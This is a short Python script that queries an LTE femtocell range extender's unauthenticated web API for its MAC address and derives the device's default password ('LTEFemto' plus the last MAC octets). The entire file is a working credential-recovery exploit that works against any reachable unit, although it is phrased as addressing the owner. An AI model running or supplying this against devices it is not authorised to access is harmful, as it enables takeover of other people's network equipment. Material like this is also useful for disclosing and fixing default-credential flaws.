import requests
import argparse
import time
import json 


address = input("Please input the ip/domain name of your range extender")

def getmac(addr):
    if "http://" in addr:
        r = requests.get(f"{addr}/webapi/simStatus?_={int(time.time()) }")
    else: 
        r = requests.get(f"http://{addr}/webapi/simStatus?_={int(time.time()) }")
    return json.loads(r.text)["macAddress"]

def getlast2ofmac(macaddress):
    return ''.join(macaddress.split(":")[4:])

print(f"Your default password is: LTEFemto{getlast2ofmac(getmac(address))}")
